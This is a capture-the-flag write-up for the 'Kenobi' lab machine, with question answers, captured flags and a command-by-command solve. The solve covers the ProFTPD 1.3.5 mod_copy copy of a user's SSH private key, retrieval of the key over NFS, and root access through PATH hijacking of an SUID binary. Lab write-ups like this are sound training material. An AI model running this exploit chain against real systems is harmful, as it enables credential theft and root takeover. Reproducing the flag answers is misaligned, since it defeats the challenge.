# Kenobi

* * *

## Task 1
This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.
```
#1 Make sure you're connected to our network and deploy the machine
```
```
#2 Scan the machine with nmap, how many ports are open?

7
```
## [Task 2] Enumerating Samba for shares

```
#1 Using the nmap command above, how many shares have been found?

3
```
```
#2 Once you're connected, list the files on the share. What is the file can you see?

log.txt
```
```
#3 What port is FTP running on?

21
```
```
#4 What NFS mount can we see?

/var
```

## [Task 3] Gain initial access with ProFtpd

```
#1 Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port.
What is the version?

1.3.5
```

```
#2 How many exploits are there for the ProFTPd running?

3
```
```
#3 You should have found an exploit from ProFtpd's mod_copy module. 
The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.
We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. 
```
```
#4 We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.
We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.
```
```
#5 What is Kenobi's user flag (/home/kenobi/user.txt)?

d0b0f3f53b6caa532a83915e19224899
```

## [Task 4] Privilege Escalation with Path Variable Manipulation

```
#1 SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.
To search the a system for these type of files run the following: find / -perm -u=s -type f 2>/dev/null

What file looks particularly out of the ordinary? 

/usr/bin/menu
```
```
#2 Run the binary, how many options appear?

3
```
```
#3 Strings is a command on Linux that looks for human readable strings on a binary.
This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).
As this file runs as the root users privileges, we can manipulate our path gain a root shell.
We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!
```
```
#4 What is the root flag (/root/root.txt)?

177b3cd8562289f37382721c28381f02
```
* * *

# Solving through

```
export $ip = 10.10.20.151
```
$ nmap -sC -sV -oN nmap.txt $ip

```
# Nmap 7.80 scan initiated Fri Jun 26 23:00:40 2020 as: nmap -sC -sV -oN nmap.txt 10.10.20.151
Nmap scan report for 10.10.20.151
Host is up (0.092s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      35992/udp   mountd
|   100005  1,2,3      36735/tcp   mountd
|   100005  1,2,3      39561/udp6  mountd
|   100005  1,2,3      47277/tcp6  mountd
|   100021  1,3,4      33927/tcp6  nlockmgr
|   100021  1,3,4      39123/udp   nlockmgr
|   100021  1,3,4      44113/tcp   nlockmgr
|   100021  1,3,4      45498/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2020-06-26T15:00:57-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-26T20:00:57
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 26 23:00:59 2020 -- 1 IP address (1 host up) scanned in 18.70 seconds

```

$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $ip
```
Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.20.151\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.20.151\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.20.151\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
|_smb-enum-users: ERROR: Script execution failed (use -d to debug)
```
$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $ip
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 23:09 EEST
Nmap scan report for 10.10.20.151
Host is up (0.075s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

```
### Exploiting ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution 

```
$ nc $ip 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.20.151]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```
### Mounting NFS to retrieve the ssh key

```
mkdir kenobiNFS
sudo mount $ip:/var ./kenobiNFS
ls -la kenobiNFS
cp ./kenobiNFS/tmp/id_rsa .
sudo umount kenobiNFS
```
### SSH in the machine
```
$ chmod 400 id_rsa
$ ssh kenobi@$ip -i id_rsa
$ cat user.txt
d0b0f3f53b6caa532a83915e19224899
```
### Privesc Vectors
```
$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```
### Path Manipulation
```
$ /usr/bin/menu

***************************************   
1. status check
2. kernel version
3. ifconfig                                                                                 
** Enter your choice :1                                                                     
HTTP/1.1 200 OK                                                                             
Date: Fri, 26 Jun 2020 20:19:52 GMT                                                         
Server: Apache/2.4.18 (Ubuntu)                                                              
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT                                                
ETag: "c8-591b6884b6ed2"                                                                    
Accept-Ranges: bytes                                                                        
Content-Length: 200                                                                         
Vary: Accept-Encoding                                                                       Content-Type: text/html

$ cp /bin/sh /tmp/curl                  
$ ls -al /tmp/curl
-rw-rw-r-- 1 kenobi kenobi 8 Jun 26 15:29 /tmp/curl
$ ls -la $(which curl)
-rwxr-xr-x 1 root root 190408 Jan 29  2019 /usr/bin/curl
$ chmod 755 /tmp/curl
$ ls -al /tmp/curl                  
-rwxr-xr-x 1 kenobi kenobi 1037528 Jun 26 15:20 /tmp/curl
$ export PATH="/tmp:$PATH"

$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1

# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# cat /root/root.txt
177b3cd8562289f37382721c28381f02
```